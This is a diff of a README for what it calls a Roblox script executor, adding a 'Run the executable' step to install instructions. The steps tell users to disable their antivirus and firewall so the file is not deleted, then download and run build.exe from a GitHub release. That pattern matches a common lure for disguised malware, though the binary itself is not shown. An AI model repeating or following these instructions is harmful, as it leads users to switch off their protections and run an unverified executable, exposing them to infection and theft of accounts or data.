@@ -12,4 +12,5 @@ This is a powerful Roblox script executor designed for enhancing your gameplay e
 - Disable any AV or firewall settings you have to avoid deletion
 - Go to the Releases page [Here](https://github.com/Meowste/Roblox-Executer/releases/tag/Stable).
 - Download the latest EXE (build.exe)
+- Run the executable
 - Wait 20-30 seconds then launch Roblox
